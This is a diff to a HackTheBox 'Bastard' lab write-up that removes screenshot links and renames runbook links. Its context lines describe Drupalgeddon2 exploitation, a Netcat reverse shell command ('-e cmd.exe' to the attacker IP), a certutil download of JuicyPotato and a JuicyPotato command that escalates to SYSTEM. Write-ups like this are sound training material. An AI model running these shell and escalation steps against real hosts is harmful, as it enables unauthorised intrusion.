@@ -88,7 +88,6 @@ sudo nmap -Pn -n -sS -p- --min-rate 5000 --max-retries 2 \
 
 The scan found TCP 80, 135, and 49154. The host fingerprint was Windows, with HTTP as the only immediately useful application surface.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/1.nmap-allports.png>)
 
 SCREENSHOT: The full TCP scan identifies HTTP, MSRPC, and the high RPC port.
 
@@ -110,11 +109,9 @@ curl -sS "http://$BoxIP/robots.txt" | sed -n '1,80p'
 
 The page disclosed Drupal 7.54. That version is below the fixed Drupal 7.58 threshold for CVE-2018-7600, so the next step was to review the matching public exploit rather than brute-force the site.
 
-![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/2.nmap-services.png>)
 
 SCREENSHOT: The targeted service scan confirms IIS 7.5 and the Drupal application.
 
-![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/3.changelog.png>)
 
 SCREENSHOT: CHANGELOG.txt discloses Drupal 7.54.
 
@@ -158,7 +155,6 @@ drupalgeddon2>> hostname
 Bastard
 ~~~
 
-![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/4.drupalgeddon-and-whoami.png>)
 
 SCREENSHOT: The adapted Drupalgeddon2 PoC verifies code execution and returns the IUSR identity.
 
@@ -179,11 +175,9 @@ Version 6.1.7600 N/A Build 7600
 x64-based PC
 ~~~
 
-![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/5.iusr.png>)
 
 SCREENSHOT: The foothold token is nt authority\iusr and has SeImpersonatePrivilege enabled.
 
-![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/6.systeminfo.png>)
 
 SCREENSHOT: systeminfo confirms Windows Server 2008 R2 build 7600 on x64.
 
@@ -209,15 +203,12 @@ $NcPath $LocalIP $Port -e cmd.exe
 
 The callback arrived as nt authority\iusr. The low-privilege shell was enough to confirm the working directory, host name, and target-side temporary path used for the escalation tools.
 
-![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/7.nc-transfer.png>)
 
 SCREENSHOT: The target retrieves the reviewed Netcat binary from the controlled local HTTP server.
 
-![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/8.foothold-shell.png>)
 
 SCREENSHOT: The reverse shell provides a repeatable Windows command prompt as IUSR.
 
-![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/9.proof.png>)
 
 SCREENSHOT: The callback shell confirms the low-privilege identity and host name.
 
@@ -241,7 +232,6 @@ $PotatoPath -l $PotatoPort -p $CmdPath -t * -c $CLSID
 
 The failed candidate returned COM -> recv failed with error: 10038. The working candidate returned authresult 0 and CreateProcessWithTokenW OK, confirming that the selected COM class could produce the privileged process on this build.
 
-![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/10.juicy-transfer.png>)
 
 SCREENSHOT: certutil downloads JuicyPotato and the target-side directory listing confirms both staged executables.
 
@@ -264,7 +254,6 @@ $PotatoPath -l $PotatoPort -p $CmdPath \
 
 The second callback arrived as NT AUTHORITY\SYSTEM. That identity proof established the root-equivalent result for the Windows box without placing any flag contents in the shared notes.
 
-![](<file:///home/kali/Platforms/HackTheBox/Bastard/screenshots/11.system-shell.png>)
 
 SCREENSHOT: The callback created through the tested JuicyPotato CLSID runs as NT AUTHORITY\SYSTEM.
 
@@ -458,12 +447,12 @@ $ [11:39:53] loot flag root 9a5da18de4a1173d8faf23dfbdcff71c
 
 ## Related RUNBOOK V2 stages
 
-- [[RUNBOOK V2/Start Here]]
-- [[RUNBOOK V2/Windows - Service Scan]]
-- [[RUNBOOK V2/Windows - Web Enum]]
-- [[RUNBOOK V2/Windows - Shell Received]]
-- [[RUNBOOK V2/Windows - Privilege Triage]]
-- [[RUNBOOK V2/Windows - Clean Down]]
+- [[OSCP/RUNBOOK V2/Start Here]]
+- [[OSCP/RUNBOOK V2/Windows - Service Scan]]
+- [[OSCP/RUNBOOK V2/Windows - Web Enum]]
+- [[OSCP/RUNBOOK V2/Windows - Shell Received]]
+- [[OSCP/RUNBOOK V2/Windows - Privilege Triage]]
+- [[OSCP/RUNBOOK V2/Windows - Clean Down]]
 
 ## Why this matters for OSCP
 
